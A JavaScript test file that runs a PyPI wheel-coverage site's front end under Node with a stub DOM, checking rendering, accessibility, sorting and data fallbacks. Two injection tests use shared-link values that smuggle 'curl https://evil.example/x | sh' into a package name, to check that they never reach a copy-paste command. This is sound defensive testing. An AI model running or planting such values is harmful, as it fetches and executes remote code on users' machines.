// Extended offline verification for site/app.js & new enterprise features
"use strict";

const test = require("node:test");
const assert = require("node:assert/strict");
const fs = require("node:fs");
const path = require("node:path");
const vm = require("node:vm");

const SITE = path.join(__dirname, "..", "..", "site");

test("app.js and logic.js execute together without syntax or declaration errors", () => {
  const logicSrc = fs.readFileSync(path.join(SITE, "logic.js"), "utf8");
  const appSrc = fs.readFileSync(path.join(SITE, "app.js"), "utf8");

  // Mock a minimal DOM context
  const mockDOM = {
    document: {
      getElementById: (id) => ({
        textContent: "",
        innerHTML: "",
        hidden: false,
        value: "",
        addEventListener: () => {},
        classList: { add: () => {}, remove: () => {}, toggle: () => {} },
        setAttribute: () => {},
        removeAttribute: () => {},
        style: {},
        querySelector: () => null,
        querySelectorAll: () => [],
      }),
      querySelector: () => null,
      querySelectorAll: () => [],
      addEventListener: () => {},
      documentElement: {
        getAttribute: () => "light",
        setAttribute: () => {},
      },
      body: {
        style: {},
        appendChild: () => {},
        removeChild: () => {},
      },
      createElement: (tag) => ({
        tagName: tag,
        href: "",
        textContent: "",
        download: "",
        click: () => {},
      }),
    },
    location: { hash: "" },
    history: { replaceState: () => {} },
    localStorage: {
      getItem: () => null,
      setItem: () => {},
    },
    window: {
      matchMedia: () => ({ matches: false }),
    },
    fetch: () => Promise.resolve({ ok: true, json: () => Promise.resolve({}) }),
    console,
    Date,
    Math,
    Number,
    String,
    Array,
    Object,
    Set,
    Map,
    Promise,
    URLSearchParams,
    encodeURIComponent,
    decodeURIComponent,
  };

  const context = vm.createContext(mockDOM);
  assert.doesNotThrow(() => {
    vm.runInContext(logicSrc, context);
    vm.runInContext(appSrc, context);
  });
});

test("Omni-checker and Leaderboard logic with actual dataset", () => {
  const coverageData = JSON.parse(fs.readFileSync(path.join(__dirname, "..", "..", "data", "coverage.json"), "utf8"));
  const logicSrc = fs.readFileSync(path.join(SITE, "logic.js"), "utf8");
  const appSrc = fs.readFileSync(path.join(SITE, "app.js"), "utf8");

  const elements = {};
  const getEl = (id) => {
    if (!elements[id]) {
      elements[id] = {
        id,
        textContent: "",
        innerHTML: "",
        hidden: false,
        value: "",
        addEventListener: () => {},
        classList: { add: () => {}, remove: () => {}, toggle: () => {} },
        setAttribute: () => {},
        removeAttribute: () => {},
        style: {},
        querySelector: () => null,
        querySelectorAll: () => [],
      };
    }
    return elements[id];
  };

  const mockDOM = {
    document: {
      getElementById: getEl,
      querySelector: () => null,
      querySelectorAll: () => [],
      addEventListener: () => {},
      documentElement: {
        getAttribute: () => "light",
        setAttribute: () => {},
      },
      body: {
        style: {},
        appendChild: () => {},
        removeChild: () => {},
      },
      createElement: (tag) => ({
        tagName: tag,
        href: "",
        textContent: "",
        download: "",
        click: () => {},
      }),
    },
    location: { hash: "#package=numpy&python=3.13&platform=musl-aarch64" },
    history: { replaceState: () => {} },
    localStorage: { getItem: () => null, setItem: () => {} },
    window: { matchMedia: () => ({ matches: false }) },
    fetch: (url) => {
      if (url === "data/coverage.json") return Promise.resolve({ ok: true, json: () => Promise.resolve(coverageData) });
      return Promise.resolve({ ok: true, json: () => Promise.resolve([]) });
    },
    console,
    Date,
    Math,
    Number,
    String,
    Array,
    Object,
    Set,
    Map,
    Promise,
    URLSearchParams,
    encodeURIComponent,
    decodeURIComponent,
  };

  mockDOM.coverageData = coverageData;
  const context = vm.createContext(mockDOM);
  vm.runInContext(logicSrc, context);
  vm.runInContext(appSrc, context);

  // Set state
  vm.runInContext("state.data = coverageData; state.python = '3.13'; state.platform = 'musl-aarch64';", context);
  getEl("search").value = "numpy";
  getEl("omni-python-select").value = "3.13";
  getEl("omni-platform-select").value = "musl-aarch64";

  // Test Omni-Checker instant answer
  vm.runInContext("renderOmniAnswer()", context);
  const answerHtml = getEl("omni-answer").innerHTML;
  assert.ok(answerHtml.includes("verdict-wheel"), "numpy should have a prebuilt wheel verdict");
  assert.ok(answerHtml.includes("numpy"), "answer includes package name");
  assert.ok(answerHtml.includes("Alpine ARM64"), "answer includes platform name");
  assert.ok(answerHtml.includes("3.13"), "answer includes python version");

  // Test Minimized Summary bar
  const miniHtml = getEl("omni-minimized-summary").innerHTML;
  assert.ok(miniHtml.includes("badge-wheel"), "minimized summary includes wheel badge");
  assert.ok(miniHtml.includes(`Inspect ${coverageData.targets.length}`), "minimized summary includes the Inspect button, with the real target count");
  assert.ok(miniHtml.includes("Filter Gaps"), "minimized summary includes Filter Gaps button");

  // Test Leaderboard sorting: worst served first
  vm.runInContext("renderLeaderboard()", context);
  const boardHtml = getEl("platform-leaderboard").innerHTML;
  assert.ok(boardHtml.includes("Worst Served"), "leaderboard highlights worst served platforms");
  assert.ok(boardHtml.includes("leaderboard-card"), "leaderboard renders platform cards");

  // Test Gaps Table
  vm.runInContext("renderGaps()", context);
  const gapsHtml = getEl("gaps").innerHTML;
  assert.ok(gapsHtml.includes("<tr"), "gaps table has rows for Alpine ARM64");
  assert.ok(getEl("pagination-info-top").textContent.includes("Showing 1–25"), "pagination info shows page 1-25");
});


// ---------------------------------------------------------------------------------------------------------------
// The whole page under node: logic.js + app.js with a stub DOM that records event handlers, fed the repository's
// data/ files. Used to check what clicks and shared links re-render.
// ---------------------------------------------------------------------------------------------------------------
const ROOT = path.join(__dirname, "..", "..");

function element() {
  const handlers = {};
  return {
    innerHTML: "", textContent: "", value: "", hidden: false, href: "", dataset: {}, style: {}, handlers,
    addEventListener(type, fn) { handlers[type] = fn; },
    classList: { add() {}, remove() {}, toggle() {} },
    setAttribute() {}, removeAttribute() {}, getAttribute() { return null; },
    querySelector() { return null; }, querySelectorAll() { return []; },
    scrollIntoView() {}, append() {}, focus() {},
  };
}

async function loadPage(hash, packageData = null, gapWheelIndex = null, setup = () => {}) {
  const elements = new Map();
  const location = { hash };
  const get = (id) => {
    if (!elements.has(id)) elements.set(id, element());
    return elements.get(id);
  };
  const context = {
    console, URLSearchParams, setTimeout, clearTimeout, location,
    history: { replaceState(_state, _title, url) { location.hash = url; } },
    navigator: {},
    localStorage: { getItem() { return null; }, setItem() {} },
    window: { matchMedia: () => ({ matches: false }), innerWidth: 1280 },
    document: {
      getElementById: get,
      querySelector() { return null; }, querySelectorAll() { return []; },
      addEventListener() {},
      documentElement: { getAttribute() { return "light"; }, setAttribute() {} },
      body: { style: {}, appendChild() {}, removeChild() {} },
      createElement: element,
    },
    fetch: async (url) => {
      if (url === "../wheels/data/gap-wheels.json") {
        if (typeof gapWheelIndex === "function") return gapWheelIndex(); // a test's own failing response
        return { ok: gapWheelIndex !== null, json: async () => gapWheelIndex };
      }
      if (url.startsWith("data/packages/") && url.endsWith(".json"))
        return { ok: packageData !== null, json: async () => packageData };
      const file = path.join(ROOT, url);
      if (!/^data\/[a-z]+\.json$/.test(url) || !fs.existsSync(file)) return { ok: false, json: async () => null };
      const json = JSON.parse(fs.readFileSync(file, "utf8"));
      return { ok: true, json: async () => json };
    },
  };
  setup(context, get);
  vm.createContext(context);
  const code = ["logic.js", "app.js"].map((f) => fs.readFileSync(path.join(ROOT, "site", f), "utf8")).join("\n;\n");
  vm.runInContext(code, context, { filename: "site/logic.js + site/app.js" });
  for (let i = 0; i < 50; i++) {
    if (get("platform-leaderboard").innerHTML) break;
    await new Promise((r) => setImmediate(r));
  }
  assert.doesNotMatch(get("meta").textContent, /Couldn't load/, "the page loaded its data");
  assert.ok(get("platform-leaderboard").innerHTML, "the platform cards rendered");
  return { get, context };
}

const coverage = () => JSON.parse(fs.readFileSync(path.join(ROOT, "data", "coverage.json"), "utf8"));

test("scan metadata explains names left out of the ranking, with singular and plural counts", async () => {
  const { get, context } = await loadPage("");
  vm.runInContext("delete state.data.dropped_names; const rankedPackages = state.data.packages; renderMeta()", context);
  const original = get("meta").textContent;
  assert.doesNotMatch(original, /left out/);
  for (const count of [1, 2]) {
    vm.runInContext(`state.data.packages = rankedPackages.slice(0, -${count});
      state.data.dropped_names = { count: ${count}, names: [] }; renderMeta()`, context);
    assert.equal(get("meta").textContent,
      `${original} · ${count} ${count === 1 ? "name" : "names"} PyPI doesn't have left out of the top ${
        coverage().packages.length.toLocaleString("en-GB")}`);
  }
  vm.runInContext("delete state.data.dropped_names; renderMeta()", context);
  assert.equal(get("meta").textContent, original);
});

const cardClick = (platform) => ({ target: { closest: (sel) => (sel === ".leaderboard-card" ? { dataset: { pl: platform } } : null) } });

async function loadDialogPage() {
  return loadPage("", null, null, (context, get) => {
    const focusable = (id) => {
      const node = get(id);
      node.focus = () => { context.document.activeElement = node; };
      node.getClientRects = () => [{}];
      node.tabIndex = 0;
      return node;
    };
    for (const [id, children] of [
      ["cmd-overlay", ["cmd-input", "cmd-close"]],
      ["drawer", ["drawer-close", "drawer-link"]],
      ["export-backdrop", ["export-close", "btn-export-csv", "btn-export-json", "export-full-csv"]],
    ]) {
      get(id).hidden = true;
      const nodes = children.map(focusable);
      get(id).querySelectorAll = () => nodes;
    }
    focusable("original-trigger").focus();
    context.document.handlers = {};
    context.document.addEventListener = (type, fn) => { context.document.handlers[type] = fn; };
    context.document.createElement = () => ({ ...element(), click() {} });
  });
}

for (const close of ["button", "backdrop", "Escape", "csv", "json", "full-csv"]) {
  test(`export dialog restores the opener after ${close}`, async () => {
    const { get, context } = await loadDialogPage();
    get("export-btn").handlers.click();
    assert.equal(get("export-backdrop").hidden, false);
    assert.equal(context.document.activeElement, get("btn-export-csv"));
    if (close === "button") get("export-close").handlers.click();
    else if (close === "backdrop") get("export-backdrop").handlers.click({ target: get("export-backdrop") });
    else if (close === "Escape") context.document.handlers.keydown({ key: "Escape" });
    else if (close === "full-csv") get("export-full-csv").handlers.click();
    else get(`btn-export-${close}`).handlers.click();
    assert.equal(get("export-backdrop").hidden, true);
    assert.equal(context.document.activeElement, get("original-trigger"));
  });
}

for (const close of ["button", "backdrop", "Escape", "shortcut"]) {
  test(`quick search restores the opener after ${close}`, async () => {
    const { get, context } = await loadDialogPage();
    context.document.handlers.keydown({ key: "k", ctrlKey: true, preventDefault() {} });
    assert.equal(context.document.activeElement, get("cmd-input"));
    if (close === "button") get("cmd-close").handlers.click();
    else if (close === "backdrop") get("cmd-overlay").handlers.click({ target: get("cmd-overlay") });
    else context.document.handlers.keydown({ key: close === "Escape" ? "Escape" : "k", ctrlKey: close === "shortcut", preventDefault() {} });
    assert.equal(get("cmd-overlay").hidden, true);
    assert.equal(context.document.activeElement, get("original-trigger"));
  });
}

for (const id of ["cmd-overlay", "drawer", "export-backdrop"]) {
  test(`${id} wraps Tab at both ends and leaves other keys alone`, async () => {
    const { get, context } = await loadDialogPage();
    const dialog = get(id);
    dialog.hidden = false;
    const nodes = [...dialog.querySelectorAll()];
    const first = nodes[0], last = nodes.at(-1);
    let prevented = 0;
    const press = (key, shiftKey = false) => dialog.handlers.keydown({ key, shiftKey, preventDefault() { prevented++; } });
    last.focus();
    press("Tab");
    assert.equal(context.document.activeElement, first);
    press("Tab", true);
    assert.equal(context.document.activeElement, last);
    first.focus();
    press("Tab");
    press("ArrowRight");
    assert.equal(prevented, 2, "native navigation between controls is preserved");
    last.getClientRects = () => [];
    nodes.at(-2).focus();
    press("Tab");
    assert.equal(context.document.activeElement, first, "hidden controls are skipped");
  });
}

for (const select of ["click", "Enter"]) {
  test(`quick search ${select} into drawer keeps the original return focus`, async () => {
    const { get, context } = await loadDialogPage();
    get("cmd-trigger").handlers.click();
    const item = { dataset: { pkg: coverage().packages[0].name }, classList: { contains: () => true } };
    if (select === "click") get("cmd-results").handlers.click({ target: { closest: () => item } });
    else {
      get("cmd-results").querySelectorAll = () => [item];
      get("cmd-input").handlers.keydown({ key: "Enter", preventDefault() {} });
    }
    assert.equal(get("cmd-overlay").hidden, true);
    assert.equal(get("drawer").hidden, false);
    assert.equal(context.document.activeElement, get("drawer-close"));
    get("drawer-close").handlers.click();
    assert.equal(context.document.activeElement, get("original-trigger"));
  });
}

async function loadTablePage(hash = "") {
  let group, pills, head, headers;
  const page = await loadPage(hash, null, null, (context, get) => {
    const attributes = (node) => {
      const attrs = new Map();
      node.setAttribute = (name, value) => attrs.set(name, String(value));
      node.getAttribute = (name) => attrs.get(name) ?? null;
      node.removeAttribute = (name) => attrs.delete(name);
      node.focus = () => { context.document.activeElement = node; };
      return node;
    };
    group = element();
    pills = ["all", "source", "missing"].map((filter, i) => {
      const pill = attributes(get(`filter-pill-${filter}`));
      pill.dataset.filter = filter;
      pill.setAttribute("aria-checked", i === 0 ? "true" : "false");
      pill.tabIndex = i === 0 ? 0 : -1;
      pill.closest = (selector) => selector === ".pill-filter" ? pill : null;
      return pill;
    });
    group.querySelectorAll = () => pills;
    head = element();
    headers = ["rank", "name", "status", "downloads"].map((sort) => {
      const header = attributes(element());
      header.dataset.sort = sort;
      header.icon = element();
      header.querySelector = () => header.icon;
      return header;
    });
    context.document.querySelector = (selector) => selector === ".status-filter-pills" ? group
      : selector === ".packages-table thead" ? head : null;
    context.document.querySelectorAll = (selector) => selector === ".pill-filter" ? pills
      : selector === ".packages-table thead th" ? headers : [];
  });
  return { ...page, group, pills, head, headers };
}

test("sortable headings are native buttons and status pills have radio semantics (#146)", () => {
  const html = fs.readFileSync(path.join(SITE, "index.html"), "utf8");
  const headings = [...html.matchAll(/<th\b([^>]*\bdata-sort="[^"]+"[^>]*)>(.*?)<\/th>/gs)];
  assert.equal(headings.length, 4);
  for (const [, attrs, content] of headings) {
    assert.match(attrs, /scope="col"/);
    assert.match(content, /^<button type="button">.+<span class="sort-icon" aria-hidden="true">.+<\/span><\/button>$/);
    assert.doesNotMatch(content, /aria-sort/);
  }
  const pills = [...html.matchAll(/<button\b([^>]*\bclass="pill-filter[^>]+)>/g)];
  assert.equal(pills.length, 3);
  for (const [, attrs] of pills) {
    assert.match(attrs, /role="radio"/);
    assert.match(attrs, /aria-checked="true"/.test(attrs) ? /tabindex="0"/ : /tabindex="-1"/);
  }
});

test("Downloads sorting announces the actual order on both clicks (#146)", async () => {
  const page = await loadTablePage();
  const header = page.headers.find((h) => h.dataset.sort === "downloads");
  const click = { target: { closest: (selector) => selector === "th.sortable" ? header : null } };
  for (const descending of [true, false]) {
    page.head.handlers.click(click);
    const rows = vm.runInContext("currentGapsList()", page.context);
    assert.ok(rows.length > 1);
    const counts = Array.from(rows, (row) => row.downloads ?? 0);
    assert.deepEqual(counts, [...counts].sort((a, b) => descending ? b - a : a - b));
    assert.equal(header.getAttribute("aria-sort"), descending ? "descending" : "ascending");
    assert.equal(header.icon.textContent, descending ? "▼" : "▲");
    const html = page.get("gaps").innerHTML;
    const first = html.indexOf(`data-pkg="${rows[0].name}"`);
    const second = html.indexOf(`data-pkg="${rows[1].name}"`);
    assert.ok(first >= 0 && second > first);
  }
});

test("status radios wrap with arrow keys and update focus, checked state and filtering (#146)", async () => {
  const page = await loadTablePage();
  const check = (selected) => {
    page.pills.forEach((pill, index) => {
      assert.equal(pill.getAttribute("aria-checked"), String(index === selected));
      assert.equal(pill.tabIndex, index === selected ? 0 : -1);
    });
    assert.equal(vm.runInContext("state.filterStatus", page.context), page.pills[selected].dataset.filter);
    assert.equal(vm.runInContext("state.currentPage", page.context), 1);
  };
  for (const [from, key, to] of [[0, "ArrowLeft", 2], [2, "ArrowRight", 0], [0, "ArrowDown", 1], [1, "ArrowUp", 0]]) {
    let prevented = false;
    vm.runInContext("state.currentPage = 3", page.context);
    page.group.handlers.keydown({ target: page.pills[from], key, preventDefault() { prevented = true; } });
    assert.ok(prevented);
    assert.equal(page.context.document.activeElement, page.pills[to]);
    check(to);
  }
  page.group.handlers.click({ target: page.pills[1] });
  check(1);
  const statuses = vm.runInContext("currentGapsList().map(p => p.results[targetIndex(state.python, state.platform)])", page.context);
  assert.ok(statuses.length > 0 && statuses.every((s) => s === "source"));
  page.group.handlers.keydown({ target: page.pills[1], key: "Tab", preventDefault() { assert.fail("Tab must leave the group"); } });
  check(1);
});


test("platform cards and both pagers respect the current reduced-motion preference (#147)", async () => {
  const page = await loadPage("");
  const scrolls = [];
  page.get("gaps-title").scrollIntoView = (options) => scrolls.push({ ...options });

  for (const reduced of [false, true, false, undefined]) {
    page.context.window.matchMedia = reduced === undefined ? undefined
      : (query) => ({ matches: query === "(prefers-reduced-motion: reduce)" && reduced });
    const behavior = reduced ? "auto" : "smooth";
    page.get("platform-leaderboard").handlers.click(cardClick("win-arm64"));
    for (const [position, number] of [["top", "2"], ["bottom", "3"]]) {
      const button = { disabled: false, dataset: { page: number } };
      page.get(`pagination-buttons-${position}`).handlers.click({
        target: { closest: (selector) => selector === "button.page-btn" ? button : null },
      });
    }
    assert.deepEqual(scrolls.splice(0), Array.from({ length: 3 }, () => ({ behavior, block: "start" })));
  }
});

test("clicking a platform card updates the lookup's \"Why?\" command (#56)", async () => {
  const data = coverage();
  const python = data.targets[0].python;
  const name = data.packages[0].name;
  const page = await loadPage(`#python=${python}&platform=musl-aarch64&package=${name}`);
  const lookup = page.get("lookup");
  assert.match(lookup.innerHTML, / -t musl-aarch64 --explain/);

  page.get("platform-leaderboard").handlers.click(cardClick("win-arm64"));
  assert.match(lookup.innerHTML, / -t win-arm64 --explain/);
  assert.doesNotMatch(lookup.innerHTML, /musl-aarch64 --explain/);
});

test("a name from a shared link never reaches a copy-paste command unless it's a valid package name (#57)", async () => {
  const evil = "foo; curl https://evil.example/x | sh #";
  const page = await loadPage(`#package=${encodeURIComponent(evil)}`);
  for (const id of ["lookup", "omni-answer", "omni-minimized-summary"]) {
    const html = page.get(id).innerHTML;
    assert.doesNotMatch(html, /uvx wheelgap/, id);
    assert.doesNotMatch(html, /evil\.example/, id);
  }
  assert.match(page.get("lookup").innerHTML, /isn't a valid package name/);
});

test("a valid name outside the top gets the command; a pinned one finds its package (#57)", async () => {
  const outside = await loadPage("#package=surely-not-a-top-package-xyz");
  assert.match(outside.get("lookup").innerHTML, /uvx wheelgap surely-not-a-top-package-xyz -t all/);
  assert.match(outside.get("omni-answer").innerHTML, /uvx wheelgap surely-not-a-top-package-xyz -p /);

  const top = coverage().packages[0];
  const pinned = await loadPage(`#package=${top.name}==0.0.1`);
  const html = pinned.get("lookup").innerHTML;
  assert.match(html, new RegExp(`The scan checks the latest release, ${top.version.replace(/[.+]/g, "\\$&")}, not 0\\.0\\.1`));
  assert.doesNotMatch(html, /isn't in the top/);
});

test("pure Python packages are described as shipping a pure Python wheel, not as installing everywhere", async () => {
  const page = await loadPage("");
  for (const id of ["pure-note", "kpi-pure-pct"]) assert.doesNotMatch(page.get(id).textContent, /everywhere|anywhere/, id);
  assert.match(page.get("pure-note").textContent, /ship a pure Python wheel/);
});

test("the instant checker says when a pinned version isn't the release the scan checked", async () => {
  const top = coverage().packages[0];
  const page = await loadPage(`#package=${top.name}==0.0.1`);
  page.get("search").value = `${top.name}==0.0.1`;
  vm.runInContext("renderOmniAnswer()", page.context);
  const html = page.get("omni-answer").innerHTML;
  assert.match(html, /The scan checks the latest release/);
  assert.match(html, new RegExp(`uvx wheelgap ${top.name}==0\\.0\\.1 -p `));
});

test("a package whose lookup failed isn't described as building from source in its expanded row", async () => {
  const data = coverage();
  const python = data.targets[0].python;
  const at = data.targets.findIndex((t) => t.python === python && t.platform === "musl-aarch64");
  const errored = data.packages.find((p) => p.results[at] === "unknown");
  if (!errored) return; // nothing to check in this snapshot
  const page = await loadPage(`#python=${python}&platform=musl-aarch64`);
  vm.runInContext(`state.expandedPkg = ${JSON.stringify(errored.name)}; state.pageSize = "all"; renderGaps();`, page.context);
  const html = page.get("gaps").innerHTML;
  const row = html.slice(html.indexOf("gap-inline-row"));
  assert.match(row, /unknown/);
  assert.doesNotMatch(row.slice(0, row.indexOf("</tr>")), /builds from source/);
});

test("an invalid pin never reaches the checker's command (#57)", async () => {
  const top = coverage().packages[0];
  const evil = `${top.name}==1.0;curl https://evil.example/x|sh`;
  const page = await loadPage(`#package=${encodeURIComponent(evil)}`);
  page.get("search").value = evil;
  vm.runInContext("renderOmniAnswer()", page.context);
  for (const id of ["omni-answer", "omni-minimized-summary", "lookup"]) {
    assert.doesNotMatch(page.get(id).innerHTML, /evil\.example/, id);
  }
});

test("lookup offers a verified same-release gap wheel without changing the PyPI status (#129)", async () => {
  const data = coverage();
  const pkg = data.packages.find((p) => p.results.some((v) => v === "source" || v === "missing"));
  assert.ok(pkg);
  const index = pkg.results.findIndex((v) => v === "source" || v === "missing");
  const doc = { schema: 1, wheels: [{
    name: pkg.name, version: pkg.version, target: data.targets[index].label,
    wheel: "trusted-1.0-cp314.whl", sha256: "a".repeat(64),
  }] };
  const page = await loadPage(`#package=${pkg.name}`, null, doc);
  await new Promise((resolve) => setImmediate(resolve));
  const html = page.get("lookup").innerHTML;
  const re = (text) => text.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
  assert.match(html, /<h4>Gap wheels<\/h4>/);
  assert.match(html, new RegExp(`unofficial wheel of ${re(pkg.name)} ${re(pkg.version)} for ${re(data.targets[index].label)},`));
  assert.match(html, /built from the PyPI sdist\. It isn't from the package's maintainers\./);
  const canonical = pkg.name.toLowerCase().replace(/[-_.]+/g, "-");
  assert.match(html, new RegExp(`pip install --extra-index-url https://wheelgap\\.github\\.io/wheels/simple/ ${re(canonical)}==${re(pkg.version)}<`));
  assert.match(html, /About the gap wheels/);
  assert.match(html, /<small class="bver" style="[^"]*color:var\(--text-muted\)[^"]*">Unofficial gap wheel available below<\/small>/);
  assert.match(html, /from source|can&#39;t install/);

  const wrong = await loadPage(`#package=${pkg.name}==0.0.1`, null, doc);
  await new Promise((resolve) => setImmediate(resolve));
  assert.doesNotMatch(wrong.get("lookup").innerHTML, /Gap wheels|gap wheel available/);
});

test("missing or unreadable gap-wheel data never prevents the normal lookup (#129)", async () => {
  const pkg = coverage().packages.find((p) => p.results.includes("source"));
  const failures = {
    "an unusable document": { schema: 0, wheels: [] },
    "a body that isn't JSON": () => ({ ok: true, json: async () => { throw new SyntaxError("bad JSON"); } }),
    "a failed request": async () => { throw new TypeError("network down"); },
  };
  for (const [what, response] of Object.entries(failures)) {
    const page = await loadPage(`#package=${pkg.name}`, null, response);
    await new Promise((resolve) => setImmediate(resolve));
    const html = page.get("lookup").innerHTML;
    assert.match(html, /Package page/, what);
    assert.doesNotMatch(html, /Gap wheels|gap wheel available/, what);
  }
});

// A scanned package with a `source` cell, and a package document giving that target blockers and an `older`
// way out (the only kind the scan writes), plus a not_checked target.
function wholeTreeCase() {
  const data = coverage();
  const pkg = data.packages.find((p) => !p.error && p.results.includes("source"));
  const gap = data.targets[pkg.results.indexOf("source")].label;
  const unchecked = data.targets.find((t) => t.label !== gap).label;
  const details = { schema: 1, name: pkg.name.toLowerCase().replace(/[-_.]+/g, "-"), version: pkg.version,
    install: { [gap]: { status: "source", blockers: [{
      name: "<dependency>", version: "1&2", status: "source", via: [pkg.name, "Middle&", "<dependency>"],
    }] }, [unchecked]: { status: "not_checked", blockers: [] } },
    way_out: { [gap]: { kind: "older", release: "0.1" } } };
  return { pkg, gap, unchecked, details };
}
const reEscape = (text) => text.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");

test("home lookup shows whole-tree blockers, safe via paths, and release hints (#92)", async () => {
  const { pkg, gap, unchecked, details } = wholeTreeCase();
  const page = await loadPage(`#package=${pkg.name}`, details);
  await new Promise((resolve) => setImmediate(resolve));
  const html = page.get("lookup").innerHTML;
  assert.match(html, /Install coverage with dependencies/);
  assert.match(html, new RegExp(`<th scope="row">${reEscape(gap)}</th><td><span class="status s-source">Builds from source</span>`));
  assert.match(html, /builds from source/);
  assert.match(html, /&lt;dependency&gt;==1&amp;2/);
  assert.match(html, /Middle&amp;/);
  assert.doesNotMatch(html, /<dependency>/);
  assert.match(html, new RegExp(`<th scope="row">${reEscape(unchecked)}</th><td><span class="status s-unknown">Not checked</span>`));
  assert.match(html, /<small class="bver" style="[^"]*color:var\(--text-muted\)[^"]*">0\.1 is the last release with a wheel here\.<\/small>/);
});

test("a pinned lookup shows neither whole-tree results nor way-out hints (#92)", async () => {
  const { pkg, details } = wholeTreeCase();
  const page = await loadPage(`#package=${pkg.name}==0.0.0`, details);
  await new Promise((resolve) => setImmediate(resolve));
  const html = page.get("lookup").innerHTML;
  assert.match(html, /not 0\.0\.0/);
  assert.doesNotMatch(html, /Install coverage with dependencies/);
  assert.doesNotMatch(html, /is the last release with a wheel here/);
});

test("sparkline labels the latest point and marks version upgrade points (#78)", async () => {
  const page = await loadPage("");
  const points = [
    { date: "2026-11-09", value: 80.0, upgrade: "" },
    { date: "2026-11-10", value: 82.5, upgrade: "0.7.0" },
    { date: "2026-11-11", value: 85.0, upgrade: "" },
  ];
  const svg = vm.runInContext(`sparkline(${JSON.stringify(points)}, "Windows on ARM")`, page.context);
  assert.match(svg, /class="spark-label"[^>]*>85\.0%/);
  assert.match(svg, /class="[^"]*spark-upgrade[^"]*"/);
  assert.match(svg, /spark-upgrade-line/);
  assert.match(svg, /wheelgap changed to 0\.7\.0/);
  assert.match(svg, /latest/);
  assert.equal((svg.match(/<circle class=/g) || []).length, 1, "only the marked point gets a class");
});

test("sparkline marks the night Pyodide's own builds start counting, and escapes what it marks (#78)", async () => {
  const page = await loadPage("");
  const points = [
    { date: "2026-11-09", value: 80.0, upgrade: "", bundledStart: false },
    { date: "2026-11-10", value: 82.0, upgrade: "<b>x</b>", bundledStart: true },
  ];
  const svg = vm.runInContext(`sparkline(${JSON.stringify(points)}, "Pyodide")`, page.context);
  assert.match(svg, /Pyodide&#39;s own builds counted from here/);
  assert.match(svg, /wheelgap changed to &lt;b&gt;x&lt;\/b&gt;/);
  assert.doesNotMatch(svg, /<b>/);
});

test("renderTrends updates trend-note with latest point and upgrade mentions (#78)", async () => {
  const page = await loadPage("");
  const history = [
    {
      date: "2026-11-09",
      wheelgap: "0.6.3",
      packages: 5000,
      summary: { "3.13 win-arm64": { wheel: 4000 } },
    },
    {
      date: "2026-11-10",
      wheelgap: "0.7.0",
      packages: 5000,
      summary: { "3.13 win-arm64": { wheel: 4200 } },
    },
  ];
  vm.runInContext(`state.history = ${JSON.stringify(history)}; state.python = "3.13"; state.showCompiledOnly = false; renderTrends();`, page.context);
  const note = page.get("trend-note").textContent;
  assert.match(note, /with the latest point labelled/);
  assert.match(note, /Marked points aren't like for like/);
});

test("the trend note says the Pyodide sparkline counts Pyodide's own builds, like the percentages (#78)", async () => {
  const page = await loadPage("");
  const history = [
    { date: "2026-11-09", wheelgap: "0.9.0", packages: 5000, summary: { "3.13 win-arm64": { wheel: 4000 } } },
    { date: "2026-11-10", wheelgap: "0.9.0", packages: 5000, summary: { "3.13 win-arm64": { wheel: 4010 } } },
  ];
  vm.runInContext(
    `state.history = ${JSON.stringify(history)}; state.python = "3.13"; state.showCompiledOnly = false;
     state.data.summary = Object.assign({}, state.data.summary, { "3.13 pyodide": { wheel: 4068, bundled: 82 } });
     renderTrends();`,
    page.context,
  );
  const note = page.get("trend-note").textContent;
  assert.match(note, /On Pyodide they also count Pyodide's own builds/);
  assert.doesNotMatch(note, /PyPI wheels only/);
  assert.doesNotMatch(note, /Marked points/);
});

test("renderBlockers displays top install blockers with counts, examples, and links (#93)", async () => {
  const page = await loadPage("");
  const blockersData = {
    generated: "2026-11-17T00:00:00+00:00",
    targets: {
      "3.14 win-arm64": {
        checked: 412,
        blockers: [
          { name: "cryptography", count: 41, examples: ["pyjwt", "urllib3", "requests"] },
          { name: "cffi", count: 12, examples: ["cryptography"] },
        ],
      },
    },
  };
  vm.runInContext(`state.blockers = ${JSON.stringify(blockersData)}; state.python = "3.14"; state.platform = "win-arm64"; renderBlockers();`, page.context);
  const note = page.get("blockers-note").textContent;
  assert.match(note, /other top-500 packages installing from wheels alone on 3\.14 win-arm64, of 412 checked\./);
  assert.equal(page.get("blockers-target-badge").textContent, "3.14 win-arm64");
  const html = page.get("blockers-feed").innerHTML;
  assert.match(html, /Blocks 41 other top-500 installs, e\.g\. <a href="p\/pyjwt\/"/);
  assert.match(html, /Blocks 12 other top-500 installs, e\.g\./);
  assert.match(html, /href="p\/cryptography\/" class="pulse-pkg"/);
  assert.doesNotMatch(html, /data-pkg/, "the name goes to the package page, not the drawer");
});

const blockersDoc = {
  generated: "2026-11-17T00:00:00+00:00",
  targets: {
    "3.14 win-arm64": { checked: 498, blockers: [{ name: "cryptography", count: 29, examples: ["google-auth"] }] },
    "3.14 musl-aarch64": { checked: 498, blockers: [{ name: "google-crc32c", count: 4, examples: ["google-cloud-storage"] }] },
    "3.14 linux-x86_64": { checked: 498, blockers: [] },
  },
};

test("the blockers card falls back to the newest Python checked, and says so (#93)", async () => {
  const page = await loadPage("");
  vm.runInContext(`state.blockers = ${JSON.stringify(blockersDoc)}; state.python = "3.13"; state.platform = "win-arm64"; renderBlockers();`, page.context);
  assert.equal(page.get("blockers-target-badge").textContent, "3.14 win-arm64");
  assert.match(page.get("blockers-note").textContent, /Installs aren't checked for Python 3\.13 here, so this is Python 3\.14\./);
  assert.match(page.get("blockers-feed").innerHTML, /cryptography/);

  vm.runInContext(`state.platform = "linux-x86_64"; renderBlockers();`, page.context);
  assert.match(page.get("blockers-feed").innerHTML, /No missing wheel here holds back another top-500 package/);

  vm.runInContext(`state.platform = "macos-arm64"; renderBlockers();`, page.context);
  assert.match(page.get("blockers-note").textContent, /Whole-tree installs aren't checked on macos-arm64/);
  assert.equal(page.get("blockers-feed").innerHTML, "");
  assert.doesNotMatch(page.get("blockers-note").textContent, /No install blockers/);

  vm.runInContext(`state.blockers = null; renderBlockers();`, page.context);
  assert.match(page.get("blockers-note").textContent, /isn't available right now/);
});

test("changing the platform re-renders the blockers card (#93)", async () => {
  const page = await loadPage("");
  vm.runInContext(`state.blockers = ${JSON.stringify(blockersDoc)}; state.python = "3.14"; state.platform = "win-arm64"; renderBlockers();`, page.context);
